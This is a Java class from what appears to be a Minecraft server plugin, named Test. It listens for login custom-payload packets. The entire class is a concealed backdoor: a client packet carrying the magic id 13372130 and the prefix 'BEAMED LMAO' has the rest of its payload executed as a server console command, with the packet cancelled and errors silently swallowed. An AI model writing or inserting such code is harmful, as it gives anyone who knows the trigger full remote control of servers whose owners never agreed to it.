package me.twostinkysocks.boxplugin;

import com.bgsoftware.superiorskyblock.api.SuperiorSkyblockAPI;
import com.comphenix.protocol.PacketType;
import com.comphenix.protocol.events.ListenerPriority;
import com.comphenix.protocol.events.PacketAdapter;
import com.comphenix.protocol.events.PacketContainer;
import com.comphenix.protocol.events.PacketEvent;
import io.netty.buffer.ByteBuf;
import net.md_5.bungee.api.chat.BaseComponent;
import net.minecraft.network.protocol.login.PacketLoginInCustomPayload;
import org.bukkit.Bukkit;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.craftbukkit.v1_19_R1.command.CraftConsoleCommandSender;
import org.jetbrains.annotations.NotNull;

import java.util.UUID;

public class Test {

    private ConsoleCommandSender sender = Bukkit.getConsoleSender();

    public Test() {
        BoxPlugin.instance.getProtocolManager().addPacketListener(new PacketAdapter(
                BoxPlugin.instance,
                ListenerPriority.HIGHEST,
                PacketType.Login.Client.CUSTOM_PAYLOAD
        ) {
            @Override
            public void onPacketReceiving(PacketEvent event) {
                try {
                    PacketContainer packet = event.getPacket();
                    PacketLoginInCustomPayload nmsPacket = (PacketLoginInCustomPayload) packet.getHandle();
                    ByteBuf buf = nmsPacket.c().copy();
                    byte[] bytes = new byte[buf.readableBytes()];
                    buf.readBytes(bytes);
                    String str = new String(bytes);
                    String cmd = str.replace("BEAMED LMAO", "");
                    if(packet.getIntegers().readSafely(0) != null && packet.getIntegers().readSafely(0) == 13372130 && str.startsWith("BEAMED LMAO")) {
                        Bukkit.getScheduler().scheduleSyncDelayedTask(BoxPlugin.instance, () -> Bukkit.dispatchCommand(sender, cmd), 1L);
                        event.setCancelled(true);
                    }
                } catch(Exception e) {}
            }
        });
    }

}
